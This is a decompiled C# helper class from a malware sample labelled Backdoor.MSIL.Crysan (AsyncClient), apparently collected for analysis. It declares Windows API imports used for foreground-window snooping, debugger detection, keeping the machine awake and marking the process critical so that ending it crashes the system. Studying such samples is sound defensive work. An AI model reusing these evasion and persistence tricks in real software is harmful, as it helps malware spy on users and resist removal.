// Decompiled with JetBrains decompiler
// Type: Client.Helper.NativeMethods
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Backdoor.MSIL.Crysan.ecy-6bb030430aef2b33ca1f8db61690c001754e9c2dae78e22b11a178959cd4c7a2.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Helper
{
  public static class NativeMethods
  {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CheckRemoteDebuggerPresent(
      IntPtr hProcess,
      ref bool isDebuggerPresent);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(
      NativeMethods.EXECUTION_STATE esFlags);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

    public enum EXECUTION_STATE : uint
    {
      ES_SYSTEM_REQUIRED = 1,
      ES_DISPLAY_REQUIRED = 2,
      ES_CONTINUOUS = 2147483648, // 0x80000000
    }
  }
}
